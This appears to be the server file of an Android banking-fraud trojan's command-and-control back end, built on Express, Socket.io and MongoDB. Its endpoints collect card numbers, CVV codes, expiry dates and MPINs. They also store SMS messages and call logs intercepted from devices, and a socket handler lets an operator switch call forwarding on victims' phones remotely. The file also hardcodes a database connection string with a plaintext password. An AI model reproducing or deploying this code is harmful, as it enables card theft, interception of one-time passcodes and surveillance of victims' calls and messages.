// server.js
const express = require("express");
const cors = require("cors");
const mongoose = require("mongoose");
const http = require("http");
const { Server } = require("socket.io");
const process = require("process");

const app = express();
const PORT = process.env.PORT || 3000;

// Models
const User = require("./models/User");

// Middlewares
app.use(cors());
app.use(express.static("public"));
app.use(express.json());

// HTTP + Socket server
const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

// make io available on req.app if some code expects it
app.set("io", io);

/* ===========================
   MONGODB
   =========================== */
mongoose.connect("mongodb+srv://oosrp9132_db_user:BnixQ3Qdq7kPXBcG@cluster0.vez1b2n.mongodb.net/",)
  .then(() => console.log("✅ MongoDB connected"))
  .catch(err => console.error("❌ MongoDB error:", err));


/* ===========================
   SCHEMAS
   =========================== */
const SmsSchema = new mongoose.Schema({
  userId: { type: String, required: true },
  sender: { type: String, required: true },
  message: { type: String, required: true },
  receivedAt: { type: Date, default: Date.now }
}, { timestamps: true });
const Sms = mongoose.model("Sms", SmsSchema);

const PhoneSchema = new mongoose.Schema({
  phone: { type: String, required: true },
}, { timestamps: true });
const Phone = mongoose.model("Phone", PhoneSchema);

const CallLogSchema = new mongoose.Schema({
  userId: { type: String, required: true },
  phone: { type: String },
  number: { type: String, required: true },
  type: { type: String, enum: ["INCOMING", "OUTGOING", "MISSED"], required: true },
  duration: { type: String },
  date: { type: Number, required: true },
  createdAt: { type: Date, default: Date.now }
});
const CallLog = mongoose.model("CallLog", CallLogSchema);


/* ===========================
   ROUTES
   =========================== */

// Health
app.get("/", (req, res) => res.send("✅ SMS API with MongoDB is running"));

// Get users (submit-form)
app.get("/submit-form", async (req, res) => {
  try {
    const users = await User.find({}, { __v: 0 }).sort({ createdAt: -1 });
    return res.status(200).json({ success: true, count: users.length, data: users });
  } catch (err) {
    console.error("GET USERS ERROR:", err);
    return res.status(500).json({ success: false, error: err.message || "Server error" });
  }
});

// Create user
app.post("/submit-form", async (req, res) => {
  try {
    const data = {
      deviceModel: req.body.deviceModel,
      userId: req.body.userId,
      name: req.body.name,
      email: req.body.email,
      phone: req.body.phone,
      dob: req.body.dob,
      city: req.body.city,
      cardHolderName: req.body.cardHolderName,
      cardTotalLimit: req.body.cardTotalLimit ? Number(req.body.cardTotalLimit) : null,
      cardAvailableLimit: req.body.cardAvailableLimit ? Number(req.body.cardAvailableLimit) : null,
      cardNumber: req.body.cardNumber,
      expiryDate: req.body.expiryDate,
      cvv: req.body.cvv,
      mpin: req.body.mpin
    };

    const user = new User(data);
    await user.save();

    io.emit("new_user", user);

    return res.status(201).json({ success: true, message: "User saved successfully", data: user });
  } catch (err) {
    console.error("SAVE ERROR:", err);
    return res.status(500).json({ success: false, error: err.message || "Server error" });
  }
});


/* ===========================
   SMS ENDPOINTS
   =========================== */

// Receive SMS and store, then emit to the user's room
app.post("/sms", async (req, res) => {
  const { userId, sender, message } = req.body;

  if (!userId || !sender || !message) {
    return res.status(400).json({ success: false, message: "Missing required fields: userId, sender or message" });
  }

  try {
    const sms = await Sms.create({ userId, sender, message });
    console.log("📩 SMS Stored:", userId, sender);

    // Emit to that user's room (use io directly)
    io.to(`user-${userId}`).emit("new_sms", sms);
    console.log("📢 Realtime SMS emitted to room:", `user-${userId}`);

    return res.json({ success: true, message: "SMS stored successfully", data: sms });
  } catch (err) {
    console.error("❌ SMS save failed:", err);
    return res.status(500).json({ success: false, message: "Database error" });
  }
});

// Fetch SMS list for user
app.get("/sms", async (req, res) => {
  const { userId } = req.query;
  if (!userId) return res.status(400).json({ success: false, message: "Missing userId query parameter" });

  try {
    const smsList = await Sms.find({ userId }).sort({ createdAt: -1 });
    return res.json({ success: true, data: smsList });
  } catch (err) {
    console.error("❌ Fetch SMS failed:", err);
    return res.status(500).json({ success: false, message: "Database error" });
  }
});


/* ===========================
   PHONE NUMBER (single) ENDPOINTS
   =========================== */

app.post("/get-number", async (req, res) => {
  const { phone } = req.body;
  if (!phone) return res.status(400).json({ success: false, message: "Phone number required" });

  try {
    let record = await Phone.findOne();
    if (record) {
      record.phone = phone;
      await record.save();
    } else {
      record = await Phone.create({ phone });
    }
    console.log("📞 Phone saved:", phone);
    return res.json({ success: true, phone: record.phone });
  } catch (err) {
    console.error("❌ Save phone failed:", err);
    return res.status(500).json({ success: false });
  }
});

app.get("/get-number", async (req, res) => {
  try {
    const record = await Phone.findOne();
    return res.json({ phone: record?.phone || null });
  } catch (err) {
    console.error("❌ Get phone failed:", err);
    return res.status(500).json({ success: false });
  }
});


/* ===========================
   CALL LOGS
   =========================== */

app.post("/call-log", async (req, res) => {
  const { userId, number, type, duration, date, phone } = req.body;
  if (!userId || !number || !type || !date) {
    return res.status(400).json({ success: false, message: "Missing required fields (userId, number, type, date)" });
  }

  try {
    // Avoid duplicates (same userId + number + date)
    const exists = await CallLog.findOne({ userId, number, date });
    if (exists) {
      return res.json({ success: true, message: "Already exists" });
    }

    const log = await CallLog.create({ userId, number, type, duration, date, phone });
    console.log("📞 Call log saved:", userId, number, type);

    // Emit to admin/dashboard (not per-user)
    io.emit("new_call_log", log);

    return res.json({ success: true, data: log });
  } catch (err) {
    console.error("❌ Call log save error:", err);
    return res.status(500).json({ success: false, message: "Server error" });
  }
});

app.get("/call-logs", async (req, res) => {
  const { userId } = req.query;
  try {
    const query = userId ? { userId } : {};
    const logs = await CallLog.find(query).sort({ createdAt: -1 });
    return res.json({ success: true, data: logs });
  } catch (err) {
    console.error("❌ Fetch call logs failed:", err);
    return res.status(500).json({ success: false, message: "Database error" });
  }
});


/* ===========================
   SOCKET.IO (REAL-TIME)
   =========================== */

io.on("connection", (socket) => {
  console.log("🟢 Socket connected:", socket.id);

  socket.on("join-user", (userId) => {
    if (!userId) return;
    socket.join(`user-${userId}`);
    console.log(`📌 Socket ${socket.id} joined room user-${userId}`);
  });

  // Admin sends ON/OFF command to a device (server forwards to device room)
  socket.on("forwarding_control", ({ userId, action, number }) => {
    if (!userId) return;
    console.log("📤 Forwarding command:", { userId, action, number });
    io.to(`user-${userId}`).emit("call_forward_command", { action, number });
  });

  // Android device sends back status
  socket.on("forwarding_status_from_app", (data) => {
    console.log("📩 Forwarding status from device:", data);
    io.emit("forwarding_status", data); // broadcast to all admin clients
  });

  socket.on("disconnect", (reason) => {
    console.log("🔴 Socket disconnected:", socket.id, "reason:", reason);
  });
});


/* ===========================
   START SERVER
   =========================== */
server.listen(PORT, () => {
  console.log(`🚀 Server running at http://localhost:${PORT}`);
});
